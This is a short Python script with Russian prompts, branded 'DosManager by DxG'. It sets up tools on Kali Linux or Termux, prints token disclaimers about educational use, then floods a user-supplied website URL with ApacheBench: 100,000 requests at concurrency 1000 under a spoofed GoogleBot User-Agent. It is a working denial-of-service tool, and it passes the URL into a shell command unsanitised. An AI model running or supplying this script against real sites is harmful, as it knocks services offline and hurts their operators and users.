#!/usr/bin/env python 3
import subprocess

print("данный скрипт создан в ознакомительных целях!")
print("Автор не несёт ответственности за ваши дейстивя!")
print("НЕ ИСПОЛЬЗУЙТЕ ДАННЫЙ СКРИПТ ВО ЗЛО!")

vvod = input("Вы подтверждаете что не будете использовать скрипт в противозаконных целях? [+/-] :>")
if vvod == "+":
    print("окей, продолжаем!")
elif vvod == "-":
    print("До свидания!")
    subprocess.call("poweroff")

kali_termux = input("Где ты работаешь? [Kali Linux/Termux](K/T) :>")
if kali_termux == "T":
    pack = input("обновить пакеты? [Y/N] :>")
    if pack == "Y":
        subprocess.call("apt-get update", shell=True)
        subprocess.call("apt-get install toilet", shell=True)
        subprocess.call("pkg install apache2", shell=True)
        print("скрипт подготовлен к запуску!")
    elif pack == "N":
        print("Отлично, устанавливаем софт!")
        subprocess.call("apt-get install toilet", shell=True)
        subprocess.call("pkg install apache2", shell=True)

    subprocess.call("toilet --font big --gay DosManager", shell=True)
    subprocess.call("toilet --font term --gay by DxG", shell=True)

elif kali_termux == "K":
    pack_kali = input("обновить пакеты? [Y/N] :>")
    if pack_kali == "Y":
        subprocess.call("apt-get update", shell=True)
        print("пакеты успешно обновлены!")
    print("установка всего необходимого...")
    subprocess.call("apt-get install toilet", shell=True)
    print("скрипт подготовлен к запуску!")
    subprocess.call("toilet --font big --gay DosManager", shell=True)
    subprocess.call("toilet --font term --gay by DxG", shell=True)
else:
    print("Что-то пошло не так. Возможно вы ввели что-то не правильно.")
    print("Перезапустите скрипт и попробуйте ещё раз.")
    exit(0)

url = input("Введи url сайта (обязательно со / на конце! :>")

subprocess.call('ab -n 100000  -c 1000 -k -r -H "User-Agent: GoogleBot" ' + url, shell=True)

